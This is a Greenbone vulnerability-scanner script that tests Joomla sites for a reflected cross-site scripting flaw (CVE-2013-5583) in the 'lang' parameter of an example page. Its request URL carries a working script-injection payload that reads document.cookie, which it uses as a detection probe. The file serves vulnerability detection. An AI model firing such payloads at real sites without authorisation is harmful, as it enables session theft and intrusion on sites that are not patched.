# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:joomla:joomla";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803850");
  script_version("2024-02-19T05:05:57+0000");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2024-02-19 05:05:57 +0000 (Mon, 19 Feb 2024)");
  script_tag(name:"creation_date", value:"2013-08-06 12:51:57 +0530 (Tue, 06 Aug 2013)");

  script_name("Joomla 'lang' Parameter Cross Site Scripting Vulnerability (Aug 2013)");

  script_cve_id("CVE-2013-5583");

  script_tag(name:"summary", value:"Joomla is prone to an XSS vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request and check whether it is able to
read cookie or not.");

  script_tag(name:"solution", value:"Upgrade to version 3.2.0 or later.");

  script_tag(name:"insight", value:"Input passed via 'lang' parameter to 'libraries/idna_convert/example.php'
is not properly sanitised before being returned to the user.");

  script_tag(name:"affected", value:"Joomla versions 3.1.5 and prior");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attacker to execute arbitrary HTML
or script code or discloses sensitive information resulting in loss of confidentiality.");

  script_xref(name:"URL", value:"http://cxsecurity.com/issue/WLB-2013080045");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/527765");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/joomla-315-cross-site-scripting");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("joomla/installed");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://www.joomla.org/download.html");
  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + '/libraries/idna_convert/example.php?lang="><script>alert(document.cookie);</script><!--';

if(http_vuln_check(port:port, url:url, check_header:TRUE, pattern:"<script>alert\(document\.cookie\);</script>",
                   extra_check:">phlyLabs")) {
  report = http_report_vuln_url( port:port, url:url );
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
